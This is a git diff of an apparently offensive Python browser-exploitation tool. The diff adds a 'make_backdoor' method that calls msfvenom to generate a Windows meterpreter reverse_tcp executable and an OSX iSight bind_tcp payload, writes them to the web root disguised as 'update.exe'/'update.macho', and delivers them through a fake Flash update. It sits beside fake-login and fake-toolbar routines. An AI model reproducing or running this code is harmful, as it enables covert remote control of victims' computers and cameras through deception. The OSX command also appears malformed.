@@ -44,6 +44,7 @@ class Browser_Parser:
 			[ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1],
 			 [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], 
 			 	s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l]
+		print str(ifconfig[0][0])
 		return str(ifconfig[0][0])
 
 	def promt_fake_login(self):
@@ -120,22 +121,26 @@ class Browser_Parser:
 			return None
 
 
-	def make_meterpreter_payload(self, operating_system):
+	def make_backdoor(self):
 		'''
-			android: android/meterpreter/reverse_tcp 
-			   payload/osx/armle/shell_reverse_tcp  
+		fun little extra 
 			windows : windows/meterpreter/reverse_tcp
 			mac : osx/x86/shell_reverse_tcp    
-				payload/osx/ppc/shell/reverse_tcp  
-
+				osx/ppc/shell/reverse_tcp 
 		'''
+		operating_system = self.browser_db_router.get_os_version()[0]
+		#raw_input("plz give os: ")
+		if operating_system == None:
+			print "no OS version for this user yet..."
+			return -1
 		if operating_system.lower() == "windows":
-			print "creating windows payload..."
+			print "creating payload..."
 			os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f exe -o /var/www/html/update.exe")
 			self.exploit = "https://192.168.3.1/update.exe"
-		else:	
-			print "please supply OS"
-			pass
+		elif operating_system.lower() == 'osx':
+			os.system("msfvenom -a x86 -p osx/x86/isight/bind_tcp -b" +  r'\x00' + "lhost=" + self.lhost + " lport=" + self.lport + " -f py -o /var/www/html/update.macho")
+			self.exploit = "https://192.168.3.1/update.macho"
+		pass
 
 	def fake_toolbar(self, redirect_url):
 		if self.browser_id is None:
@@ -351,7 +356,7 @@ class Browser_Parser:
 			elif resp == 666:
 				rusure = raw_input("[!] ARE YOU SURE YOU WANT TO DO THIS?")
 				if rusure.lower() == "yes":
-					self.make_meterpreter_payload("windows")
+					self.make_backdoor()
 					self.fake_flash_update(self.exploit)
 				self.menu()
 
